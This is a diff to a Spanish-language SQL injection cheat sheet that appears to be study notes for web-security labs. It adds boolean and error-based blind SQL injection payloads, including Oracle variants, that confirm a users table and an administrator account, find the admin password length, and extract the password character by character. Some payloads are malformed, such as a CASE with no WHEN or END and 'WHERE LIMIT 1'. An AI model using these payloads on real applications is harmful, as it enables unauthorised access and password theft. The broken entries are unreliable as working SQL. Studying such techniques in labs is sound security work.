@@ -236,6 +236,46 @@ A traves de un IF
 
 ```
 
+
+###Confirmar comportamiento => Error de lógica
+'AND '1'='1											=>Valor verdadero
+'AND '1'='2											=>Valor falso
+
+###Subconsultas condicional con aplicacion
+' AND (SELECT 'a' FROM users LIMIT 1)='a																=>Verifica la existencia de la tabla usuario
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a											=>Verifica la existencia del usuario administrador
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a					=>Verifica el tamaño de la contraseña de un admin 
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a		=>Enumerar contraseña
+
+**NOTA** Depues la consulta base se pueden añadir el comentario -- ## ejemplo
+' AND (SELECT 'a' FROM users LIMIT 1)='a--
+
+# Blinq errores 
+
+###Confirmar comportamiento => Error de Sintaxis
+'													=> Error
+''													=> Cadena vacia
+
+###Tipos de subconsulta concatenadas
+'||(SELECT '')||'															=>Concatenar subconsulta verdadera
+'||(SELECT '' FROM dual)||'													=>Consulta vacia Oracle
+'||(SELECT '' FROM TablaQueNoExiste)||'										=>Consulta comporatmiento antes una tabla que no existe 
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'								=>Verifica la existencia de una tabla y limita la salida a 1 para no recibir de más [Oracle]
+'||(SELECT '' FROM users WHERE LIMIT 1)||'									=>Verifica la existencia de una tabla y limita la salida a 1 para no recibir de más
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'		=>Consulta base de inferencia con sentencia verdadera
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'		=>Consulta base de inferencia con sentencia falsa
+
+#####Consulta Aplicadas
+'||(SELECT  CASE  THEN '' ELSE 1/0 FROM users)||'																						=>Consulta adecuada para identificar la tabla usuarios 
+'||(SELECT  CASE  THEN '' ELSE 1/0 FROM unaTablaQueNoExiste)||'																			=>Consulta falsa para identificar 
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'									=>Confirma el usuario administrador 
+'||(SELECT CASE WHEN username = 'administrator' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE ROWNUM = 1)||'							=>Confirma el usuario administrador
+
+'||(SELECT CASE WHEN LENGTH(password)>$1$ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'					=>Confirma la longitud de la contraseña de admin 
+'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>$1$)||'			=>Confirma la longitud de la contraseña de admin 
+'||(SELECT CASE ((SELECT 'x' FROM users WHERE username='administrator' and LENGTH(password)=$1$)='x') THEN '' ELSE 1/0 END)||'			=>Confirma la longitud de la contraseña de admin 
+'||(SELECT CASE WHEN LENGTH(password) = $1$ THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator' AND ROWNUM = 1)||'	=>CHATGPT, solo añade el ROWNUM 
+
 ### Identificar el tipo de base de datos
 Identificar base de datos
 Identificar tablas - si pero sus comandos no funcionaron
